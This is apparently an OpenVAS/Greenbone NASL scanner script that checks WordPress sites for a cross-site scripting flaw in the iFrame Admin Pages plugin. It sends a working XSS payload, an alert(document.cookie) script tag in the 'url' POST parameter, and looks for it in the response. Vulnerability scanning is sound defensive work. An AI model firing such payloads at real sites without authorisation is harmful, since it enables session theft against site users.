CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802855" );
	script_version( "2019-12-05T15:10:00+0000" );
	script_bugtraq_id( 53522 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2019-12-05 15:10:00 +0000 (Thu, 05 Dec 2019)" );
	script_tag( name: "creation_date", value: "2012-05-16 15:26:57 +0530 (Wed, 16 May 2012)" );
	script_name( "WordPress iFrame Admin Pages Plugin 'url' Parameter XSS Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/53522" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/75626" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/112701/wpiframeadminpages-xss.txt" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "This script is Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to insert
arbitrary HTML and script code, which will be executed in a user's browser
session in the context of an affected site." );
	script_tag( name: "affected", value: "WordPress iFrame Admin Pages Plugin version 0.1 and prior" );
	script_tag( name: "insight", value: "The flaw is due to an improper validation of user supplied input
to the 'url' parameter in '/wp-content/plugins/iframe-admin-pages/main_page.php',
which allows attackers to execute arbitrary HTML and script code in a user's
browser session in the context of an affected site." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running WordPress with iFrame Admin Pages Plugin and
is prone to cross site scripting vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
useragent = http_get_user_agent();
host = http_host_name( port: port );
url = dir + "/wp-content/plugins/iframe-admin-pages/main_page.php";
postdata = "url=\"><script>alert(document.cookie)</script>&newiframe=" + "new&servicerequest=new";
ifReq = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postdata ), "\\r\\n", "\\r\\n", postdata );
ifRes = http_keepalive_send_recv( port: port, data: ifReq );
if(ifRes && IsMatchRegexp( ifRes, "HTTP/1\\.[0-9]+ 200" ) && ContainsString( ifRes, ">iFrame" ) && ContainsString( ifRes, "><script>alert(document.cookie)</script>" )){
	security_message( port );
	exit( 0 );
}

